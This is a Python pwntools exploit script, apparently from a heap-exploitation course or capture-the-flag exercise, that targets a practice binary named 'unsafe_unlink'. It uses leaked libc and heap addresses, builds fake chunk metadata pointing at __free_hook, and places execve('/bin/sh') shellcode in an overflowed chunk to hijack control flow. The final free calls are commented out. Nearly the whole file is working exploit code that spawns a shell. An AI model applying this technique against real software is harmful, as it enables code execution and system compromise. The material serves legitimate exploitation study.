#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("unsafe_unlink")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

# Select the "free" option; send index.
def free(index):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
shellcode = asm("jmp shellcode;" + "nop;"*0x16 + "shellcode:" + shellcraft.execve("/bin/sh"))
shellcode_address = heap + 0x20

# Request 2 small chunks.
overflow = malloc(0x88)
victim = malloc(0x88)

# Prepare fake chunk metadata.
# Set the fd such that the bk of the "chunk" it points to is the free hook.
fd = libc.sym.__free_hook - 0x18

# Set the bk such that the fd of the "chunk" it points to is the shellcode.
bk = shellcode_address

# Set the prev_size field of the next chunk to the actual previous chunk size.
prev_size = 0x90

# Write the fake chunk metadata to the "overflow" chunk, store the shellcode there too.
# Overflow into the succeeding chunk's size field to clear the prev_inuse flag.
edit(overflow, p64(fd) + p64(bk) + shellcode + b"X"*(0x70 - (len(shellcode))) + p64(prev_size) + p64(0x90))

# Free the "victim" chunk to trigger backward consolidation with the "overflow" chunk.
#free(victim)

# Free the "overflow" chunk to trigger system("/bin/sh").
#free(overflow)

# =============================================================================

io.interactive()
